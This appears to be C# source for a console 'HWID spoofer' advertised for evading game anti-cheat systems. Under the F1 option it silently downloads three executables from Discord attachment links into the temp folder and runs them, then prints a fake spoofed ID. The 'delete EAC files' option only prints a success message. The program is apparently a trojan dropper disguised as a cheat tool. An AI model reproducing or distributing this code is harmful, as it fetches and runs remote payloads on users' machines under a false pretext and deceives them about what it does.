using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace HWIDSpoofer
{
  internal class Program
  {
    private static void Main(string[] args)
    {
      InternetConn internetConn = new InternetConn();
      WriteImage writeImage = new WriteImage();
      Hwid hwid = new Hwid();
      MacAddress macAddress1 = new MacAddress();
      LocalIP localIp = new LocalIP();
      PublicIP publicIp = new PublicIP();
      if (internetConn.CheckForInternetConnection())
      {
        Bitmap source = writeImage.LoadPicture("https://gloimg.gbtcdn.com/images/pdm-product-pic/Electronic/2018/09/15/source-img/20180915091146_60980.jpg_500x500.jpg");
        writeImage.ConsoleWriteImage(source);
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.Write("\n\n   HWIDSpoof - Advanced tool for escaping AntiCheats eyes");
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write(" - ");
        Console.ForegroundColor = ConsoleColor.DarkCyan;
        Console.Write("Fucks even with the best anticheat system \n\n\n");
        Console.ForegroundColor = ConsoleColor.Red;
        Console.Write("   Press [Enter] key to begin with the start analysis\n\n");
label_40:
        ConsoleKeyInfo consoleKeyInfo = Console.ReadKey(true);
        if (consoleKeyInfo.Key == ConsoleKey.Enter)
        {
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("   Getting the information about your PC...\n\n");
          Thread.Sleep(1000);
          Console.ForegroundColor = ConsoleColor.Green;
          Console.Write("   Your real Hardware ID: ");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write(hwid.getHWID() + "\n");
          Console.ForegroundColor = ConsoleColor.Green;
          Console.Write("   Your real Mac Address: ");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write(macAddress1.getMac() + "\n");
          Console.ForegroundColor = ConsoleColor.Green;
          Console.Write("   Local IP address (IPV4): ");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write(localIp.GetLocalIPAddress() + "\n");
          Console.ForegroundColor = ConsoleColor.Green;
          Console.Write("   Public IP address (IPV6): ");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write(publicIp.GetPublicIPAddress());
          Console.ForegroundColor = ConsoleColor.Green;
          Console.Write("\n");
          Console.ForegroundColor = ConsoleColor.Cyan;
          Console.Write("   ------------------------------------------------------------------------\n");
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("\n");
          Console.Write("   [");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write("F1");
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("] Spoof (hide) your current HWID\n");
          Console.Write("   [");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write("F2");
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("] Change current Mac Address\n");
          Console.Write("   [");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write("F3");
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("] Delete EAC Files\n");
          Console.Write("   [");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write("ESC");
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("] Secure exit\n");
          bool flag1 = false;
          bool flag2 = false;
          bool flag3 = false;
          WebClient webClient1 = new WebClient();
          while (!flag1 || !flag2 || !flag3)
          {
            consoleKeyInfo = Console.ReadKey(true);
            switch (consoleKeyInfo.Key)
            {
              case ConsoleKey.Escape:
                Console.SetCursorPosition(0, Console.CursorTop - 1);
                Console.Write("   Secure Shutdown...");
                Thread.Sleep(1000);
                Environment.Exit(0);
                break;
              case ConsoleKey.F1:
                if (!flag1)
                {
                  byte[] bytes1 = (byte[]) null;
                  try
                  {
                    using (WebClient webClient2 = new WebClient())
                      bytes1 = webClient2.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826895653862375495/SPOILER_kathanaaa.exe");
                    Thread.Sleep(200);
                    System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\Spoofer.exe", bytes1);
                    Process.Start(Path.GetTempPath() + "\\Spoofer.exe");
                    Application.Exit();
                  }
                  catch (Exception ex)
                  {
                    int num = (int) MessageBox.Show(ex.Message);
                  }
                  Thread.Sleep(1000);
                  byte[] bytes2 = (byte[]) null;
                  try
                  {
                    using (WebClient webClient2 = new WebClient())
                      bytes2 = webClient2.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826873424218554418/SPOILER_kakatec.exe");
                    Thread.Sleep(200);
                    System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\SpooferTemp.exe", bytes2);
                    Process.Start(Path.GetTempPath() + "\\SpooferTemp.exe");
                    Application.Exit();
                  }
                  catch (Exception ex)
                  {
                    int num = (int) MessageBox.Show(ex.Message);
                  }
                  Thread.Sleep(500);
                  byte[] bytes3 = (byte[]) null;
                  try
                  {
                    using (WebClient webClient2 = new WebClient())
                      bytes3 = webClient2.DownloadData("https://cdn.discordapp.com/attachments/818302419791380525/826986930901745695/SPOILER_superbmx.exe");
                    Thread.Sleep(200);
                    System.IO.File.WriteAllBytes(Path.GetTempPath() + "\\SpooferLock.exe", bytes3);
                    Process.Start(Path.GetTempPath() + "\\SpooferLock.exe");
                    Application.Exit();
                  }
                  catch (Exception ex)
                  {
                    int num = (int) MessageBox.Show(ex.Message);
                  }
                  Thread.Sleep(5000);
                  Console.SetCursorPosition(0, Console.CursorTop - 4);
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("   [");
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("DONE");
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("]");
                  Console.Write(" HWID Spoofed to: ");
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("XXXXXXXX000000AB");
                  Console.SetCursorPosition(0, Console.CursorTop + 4);
                  break;
                }
                break;
              case ConsoleKey.F2:
                if (!flag2)
                {
                  Console.SetCursorPosition(0, Console.CursorTop - 3);
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("   [");
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("DONE");
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("]");
                  Console.Write(" New Mac Address: ");
                  Console.ForegroundColor = ConsoleColor.Red;
                  string macAddress2 = macAddress1.GenerateMACAddress();
                  macAddress1.setMAC(macAddress2);
                  Console.Write(macAddress2);
                  Console.SetCursorPosition(0, Console.CursorTop + 3);
                  flag2 = true;
                  break;
                }
                break;
              case ConsoleKey.F3:
                if (!flag3)
                {
                  Console.SetCursorPosition(0, Console.CursorTop - 2);
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("   [");
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("DONE");
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("]");
                  Console.Write(" Successfully Removed EAC files [ check ");
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("log.txt ");
                  Console.ForegroundColor = ConsoleColor.Yellow;
                  Console.Write("]");
                  Console.SetCursorPosition(0, Console.CursorTop + 2);
                  flag3 = true;
                  break;
                }
                break;
            }
          }
          Console.SetCursorPosition(0, Console.CursorTop + 1);
          Console.Write("   All steps complete\n   Press [");
          Console.ForegroundColor = ConsoleColor.Red;
          Console.Write("ESC");
          Console.ForegroundColor = ConsoleColor.Yellow;
          Console.Write("] to Exit");
          while (true)
          {
            consoleKeyInfo = Console.ReadKey(true);
            if (consoleKeyInfo.Key == ConsoleKey.Escape)
              Environment.Exit(0);
            else
              goto label_40;
          }
        }
      }
      Console.ReadLine();
    }

    private static void RegistryEdit(string v1, string v2, string v3) => throw new NotImplementedException();
  }
}